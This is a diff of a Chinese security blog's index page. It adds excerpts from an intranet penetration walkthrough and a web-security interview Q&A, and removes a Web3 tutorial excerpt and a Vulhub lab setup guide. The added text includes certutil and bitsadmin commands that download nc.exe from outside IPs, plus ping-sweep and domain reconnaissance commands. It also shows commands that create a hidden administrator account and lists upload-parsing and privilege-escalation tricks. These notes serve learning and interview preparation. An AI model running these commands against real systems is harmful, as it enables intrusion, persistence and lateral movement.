@@ -227,6 +227,269 @@
             
 
   
+    <article id="post-从命令执行到内网渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">从命令执行到内网渗透</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="archive-article-date">
+        <time datetime="2021-06-10T09:49:33.871Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-10</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><h3 id="维持访问"><a href="#维持访问" class="headerlink" title="维持访问"></a>维持访问</h3><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>此时获得了域内一台服务器的系统权限，但是该服务器不能直接访问域服务器。因此接下来需要攻击到内网中可以访问到域服务器的机器。首先需要<strong>探测内网存活主机</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @ <span class="built_in">ping</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">1</span>.%i -w <span class="number">1</span> -n <span class="number">1</span>|<span class="built_in">find</span> /i &quot;ttl=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>简单一点可以用ping扫描的方式，但是as中无法回显出结果。所以选择用<strong>nbtscan扫描。</strong>首先下载程序然后在目标机器执行：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://<span class="number">198</span>.<span class="number">13</span>.xxx.xxx/nc.exe</span><br><span class="line">nbtscan-<span class="number">1</span>.<span class="number">0</span>.<span class="number">35</span>.exe -m <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210610191018443.png" alt="image-20210610191018443"></p>
+<p><code>查看域用户</code>：net user /domain</p>
+<p><code>查看有几个域</code>：net view /domain</p>
+<p><code>查看域内主机</code>: net view /domain:xxx</p>
+<p><code>查看域内的组</code>:net view /domain</p>
+<p><code>查看域管理员</code>: net group “domain admins” /domain</p>
+<p><code>查看域控</code>: net group “domain controllers” /domain</p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3>
+    
+    <a class="article-more-a" href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/10/%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安洵面试题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="web安全面试题"><a href="#web安全面试题" class="headerlink" title="web安全面试题"></a>web安全面试题</h2><p><strong>1）给你一个目标站，你觉得应该先做什么？</strong></p>
+<p>信息收集（域名子域、真实ip、端口服务探测）</p>
+<p>漏洞发现（漏洞扫描、CMS识别、应用版本识别、poc验证漏洞存在、黑盒测试、源码审计）</p>
+<p>漏洞利用（历史漏洞、EXP利用、能否反弹shell、爆库）</p>
+<p>持续控制（提升权限、维持访问、清除痕迹）</p>
+<p><strong>2）写出下列端口对应的服务？</strong></p>
+<table>
+<thead>
+<tr>
+<th>21</th>
+<th>22</th>
+<th>80</th>
+<th>443</th>
+<th>1433</th>
+<th>3306</th>
+<th>3389</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>telnet</td>
+<td>ssh</td>
+<td>http</td>
+<td>https</td>
+<td>sqlserver</td>
+<td>mysql</td>
+<td><strong>mstsc</strong></td>
+</tr>
+</tbody></table>
+<p><strong>3）常见的上传解析漏洞</strong></p>
+<p><strong>apache：</strong>从右向左（abc.php.xxx.aaa.bbb） -&gt; abc.php</p>
+<p><strong>iis6.0:</strong> </p>
+<p>文件夹名泛解析（aaa.asp文件夹下的a.txt会以asp解析）</p>
+<p>特殊文件名(;.jpg): aaa.asp;.jpg这个文件会以asp方式运行。</p>
+<p><strong>iis7.0、7.5:</strong></p>
+<p>任意文件名.jpg，在后面追加上/任意文件名.php，那么这个文件会以PHP方式来运行 比如<a target="_blank" rel="noopener" href="http://xxxxv/tila.jpg/ccc.php">http://xxxxv/tila.jpg/ccc.php</a> 会以tila.php解析。</p>
+<p><strong>Nginx 解析漏洞：</strong></p>
+<p>任意文件名后面添加xxx.php的方式来运行这个文件</p>
+<p>在文件后面添加%00.php也会以php的方式运行。</p>
+<p><strong>3）域内常用命令</strong></p>
+<p><strong>ipconfig /all</strong>判断是否存在域，<strong>nslookup</strong>判断域控是否与dns服务器在同一服务器上，<strong>net config workstation</strong>查看登录域信息，<strong>net time /domain</strong>查看主域,若是报错或者显示时间，有域控。否则不存在域。</p>
+<p><strong>4）域管账号密码对其他成员执行命令</strong></p>
+<p><strong>5）cmd下远程文件下载</strong></p>
+<p>vb下载：先echo写入vb脚本，然后cscript执行下载脚本</p>
+<p>certutil一句话下载payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>ftp一句话下载payload：先echo写入ftp下载脚本，然后执行ftp -s:xxx</p>
+<p>bitsadmin 下载一句话/payload：bitsadmin /transfer down /download /priority normal ‘<a target="_blank" rel="noopener" href="http://198.13.37.239/nc.exe&#39;">http://198.13.37.239/nc.exe&#39;</a> d:\nc.exe</p>
+<p>js一句话读取/写入文件</p>
+<p>powershell一句话下载payload：powershell.exe -ExecutionPolicy Bypass -File down.ps1</p>
+<p><strong>6）抓包改包</strong></p>
+<p>burp、fiddle、charles</p>
+<p><strong>7）常见的web容器</strong></p>
+<p>IIS,APACHE,NGINX,TOMCAT,WEBLOGIC,DJANGO,JBOSS</p>
+<p><strong>8) 快速判断目标服务器是Windows还是linux</strong></p>
+<p>是否大小写敏感</p>
+<p><strong>9）常见的Windows提权方法</strong></p>
+<p>1）syteminfo查看补丁信息，查找exp（内核提权）</p>
+<p>2）mssql提取、udf提权</p>
+<p>3）Windows系统配置错误提权(dll劫持、<strong>注册表键AlwaysInstallElevated</strong>、<strong>可信任服务路径漏洞</strong>、自动安装配置文件*、计划任务)</p>
+<ol start="4">
+<li>bypass uac</li>
+</ol>
+<p><strong>10）下列端口对应的服务</strong></p>
+<table>
+<thead>
+<tr>
+<th>873</th>
+<th>5000</th>
+<th>5900</th>
+<th>1521</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rsync文件同步</td>
+<td></td>
+<td>vnc远程</td>
+<td>oracle</td>
+</tr>
+</tbody></table>
+<p><strong>11) .htaccess 文件配置jsp文件解析为php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p><strong>12) csrf ,ssrf .以及重放攻击的区别</strong></p>
+<p>重放攻击：以登录业务为例（不具备身份，但是有认证信息）</p>
+<p>csrf：以添加用户为例（已经有了一个身份、用户或者是管理员）</p>
+<p>ssrf： 伪造服务端发送请求，探测内网</p>
+<p><strong>13）windows下添加本地账户以及加入到管理员组的命令</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user whoami$ Liu78963 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>
+
+<p><strong>14) windows下&gt;与&gt;&gt;的区别：</strong>写入（会覆盖）与追加</p>
+<p><strong>15）常见的javaweb应用以及框架</strong></p>
+<p><strong>Hibernate、Struts2、MyBatis、Spring、spring MVC</strong> </p>
+<p><strong>16）mysql 导出文件的命令</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump 数据库名 <span class="comment">--host=主机 --port=端口 -u用户名 -p密码 --where=&quot;过滤条件&quot; --tables 数据表 &gt; 导出文件路径.sql</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>17）缓冲区溢出</strong></p>
+<p><strong>18）DNS域传送</strong>漏洞复现命令</p>
+<p><strong>19）nmap 默认扫描哪些端口</strong></p>
+<p>默认情况下，Nmap用指定的协议对端口1到1024以及<code>nmap-services</code> 文件中列出的更高的端口在扫描。</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/09/%E5%AE%89%E6%B4%B5%E9%9D%A2%E8%AF%95%E9%A2%98/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CNVD-2021-30193 " class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -853,269 +1116,6 @@
 
 
   
-    <article id="post-手把手教学web3.0(IPFS-+-Ethereum)：学会自己部署一个应用在web3.0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/02/20/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E5%AD%A6web3.0(IPFS-+-Ethereum)%EF%BC%9A%E5%AD%A6%E4%BC%9A%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%9C%A8web3.0/">手把手教学web3.0(IPFS + Ethereum)：学会自己部署一个应用在web3.0</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/02/20/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E5%AD%A6web3.0(IPFS-+-Ethereum)%EF%BC%9A%E5%AD%A6%E4%BC%9A%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%9C%A8web3.0/" class="archive-article-date">
-        <time datetime="2021-02-20T08:44:29.121Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="翻译：Learn-Web-3-0-by-actually-Deploying-an-Application-on-it-Hands-On-Approach-IPFS-Ethereum"><a href="#翻译：Learn-Web-3-0-by-actually-Deploying-an-Application-on-it-Hands-On-Approach-IPFS-Ethereum" class="headerlink" title="翻译：Learn Web 3.0 by actually Deploying an Application on it: Hands-On Approach (IPFS + Ethereum)"></a>翻译：<a target="_blank" rel="noopener" href="https://hackernoon.com/learn-web-3-0-by-actually-deploying-an-application-on-it-hands-on-approach-9141ad88588f">Learn Web 3.0 by actually Deploying an Application on it: Hands-On Approach (IPFS + Ethereum)</a></h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>去中心化web或者说web3.0已经成了如今的流行语，因为他们给当今的互联网业带来了革命性质的巨变。但有多少人真的了解web3.0呢？这篇文章涵盖了web3.0的几个主要特性。在掌握了这些基本知识之后，我将带大家在<a target="_blank" rel="noopener" href="https://hackernoon.com/tagged/ipfs">IPFS</a>上部署一个web3.0的应用。该应用程序具有在<a target="_blank" rel="noopener" href="https://hackernoon.com/tagged/ethereum">以太坊</a>虚拟机上运行的可靠的智能合约。通过使用以太坊+IPFS的组合，真正使得这个应用成为了一个去中心化的应用。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/20201_tU-ezv8Ub7MWr19MDAn8pw.gif" alt="1_tU-ezv8Ub7MWr19MDAn8pw"></p>
-<p>让我们开始吧！</p>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="为什么web3-0对我们来说很重要？"><a href="#为什么web3-0对我们来说很重要？" class="headerlink" title="为什么web3.0对我们来说很重要？"></a>为什么web3.0对我们来说很重要？</h4><p>因特网诞生之初我们叫他为web1.0，这时候的web大都是静态的。没有任何交互功能。这时候的人们访问互联网是完全匿名且隐私信息是完全安全的，因为这时候的互联网上还不曾发展出交易买卖等等功能。此时的web像地狱一样寂静。我们今天根本难以想象当时的情形。然后我们在20世纪90年代迎来了web2.0。web2.0的到来催生了一批巨人企业像Alphabet, Amazon, Microsoft等等。这时期，网络上出现了大量的交互活动但同时个人隐私沦为了别人的’玩物‘。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210220155230836.png" alt="image-20210220155230836"></p>
-<p>web3.0使参与网络的用户完全掌控他们自己的个人数据，努力想用这种方式帮助用户重新’拿回‘他们的隐私。web3.0是有民主保障的而非被少数巨头垄断，是去中心化而非中心化的网络。从web2.0转向web3.0的过程将是逐步的，而非一夜之间。但是加快这种转变最快的方式就是将这种意识传递到更多人之中。 当用户需求发生变化时，当前的业务需求也会发生变化。用户需要意识到自己才是自己个人数据的主人！如果有任何人通过你的个人数据赚到了钱，那么这个钱理应是你的。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210220160142064.png" alt="image-20210220160142064"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/20201_Bx7CQB9UWpJgctkjFTlhyQ.png" alt="1_Bx7CQB9UWpJgctkjFTlhyQ"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/20201_dottislVqks8AWsVrdbl8A.png" alt="1_dottislVqks8AWsVrdbl8A"></p>
-<h4 id="web3-0的一些特性"><a href="#web3-0的一些特性" class="headerlink" title="web3.0的一些特性"></a>web3.0的一些特性</h4><ul>
-<li>没有中央控制点：像Google，Microsoft，Amazon这样的公司将不再拥有对您数据的控制权。没有政府机构能够阻止网站和限制服务。像以太坊这样的区块链将会大放异彩，简而言之，中间人这种模式将完全不合时宜。</li>
-<li>数据所有权：最终用户将重新获得对数据的完全控制，并具有加密的安全性。目前，诸如亚马逊和Facebook之类的大公司拥有庞大的数据仓库，用于存储价值数十亿美元的用户数据以改善其服务。</li>
-<li>大大减少黑客攻击和数据泄露：因为数据将是去中心化的和分发的，所以黑客将很难找到系统的单个入口。</li>
-<li>互通性：应用程序将易于定制且与设备无关，能够在智能手机，电视，汽车，微波炉和智能传感器上运行。当前，应用程序是特定于OS的，并且通常限于单个操作系统。例如，许多Android加密货币钱包在iO上不可用，这使使用多种设备的消费者感到不便。对于负责发布多次迭代和软件更新的开发人员，这会增加额外花费与精力。</li>
-<li>无许可的区块链：财富和其他数字资产可以在世界任何地方快速，高效地跨境转移。</li>
-<li>不间断服务：帐户吊销和分布式拒绝服务大大减少了。由于没有单点故障，因此服务中断将降至最低。数据将存储在分布式节点上，以确保冗余，并且多个备份将防止服务器故障或卡死。</li>
-</ul>
-<p>Check out the awesome <a target="_blank" rel="noopener" href="https://iobf.co/">Internet of Blockchain Foundation</a> for more!</p>
-<h3 id="实操–time-for-hands-on-learing。"><a href="#实操–time-for-hands-on-learing。" class="headerlink" title="实操–time for hands-on learing。"></a>实操–time for hands-on learing。</h3><p>为了节省时间和篇幅，我已经准备了基本代码。首先，git从我的Github页面<a target="_blank" rel="noopener" href="https://github.com/niharrs/Blockchain-Voting">克隆</a>存储库。</p>
-<p>这是一个基本的民意调查应用程序，它在“朋友”和“我如何与您的母亲见面”这两档节目之间进行民意测验。 （这两个是美国非常著名的电视节目。）我个人很喜欢Friends！</p>
-<p>要顺利运行该应用程序，请确保已安装以下组件：</p>
-<ul>
-<li>NodeJS</li>
-<li>Truffle Framework</li>
-<li>Ganacha</li>
-<li>Metamask Chrome Extension</li>
-</ul>
-<p>确保Ganacha一直在运行。要运行该应用程序，请打开控制台并输入以下命令：</p>
-    
-    <a class="article-more-a" href="/2021/02/20/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E5%AD%A6web3.0(IPFS-+-Ethereum)%EF%BC%9A%E5%AD%A6%E4%BC%9A%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%9C%A8web3.0/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">web3.0</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/02/20/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E5%AD%A6web3.0(IPFS-+-Ethereum)%EF%BC%9A%E5%AD%A6%E4%BC%9A%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%9C%A8web3.0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Vulhub环境搭建" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/02/16/Vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Vulhub环境搭建</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/02/16/Vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="archive-article-date">
-        <time datetime="2021-02-16T12:53:49.128Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-16</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md">Vulhub</a>是一个面向大众的开源漏洞靶场，无需docker知识，简单执行一条命令即可编译、运行一个完整的漏洞靶场镜像。</p>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
-<li>centos7</li>
-</ul>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
-<li>安装docker</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装python3</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install python3</span><br><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装docker-compose</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装unzip</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install unzip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>启动环境</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>验证环境</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">关闭防护墙</span></span><br><span class="line"><span class="meta">#</span><span class="bash">编译、启动docker镜像</span></span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入某一个漏洞/环境的目录</span></span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自动化编译环境</span></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动整个环境</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="meta">#</span><span class="bash">查看当前镜像</span></span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
-
-<p>输出如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210216205306750.png" alt="image-20210216205306750"></p>
-<p>浏览器访问ip:port</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210216205334785.png" alt="image-20210216205334785"></p>
-<p>完成。</p>
-    
-    <a class="article-more-a" href="/2021/02/16/Vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">靶场</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/02/16/Vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1338,6 +1338,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">方法与选择</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
             
             <div class="clearfix"></div>
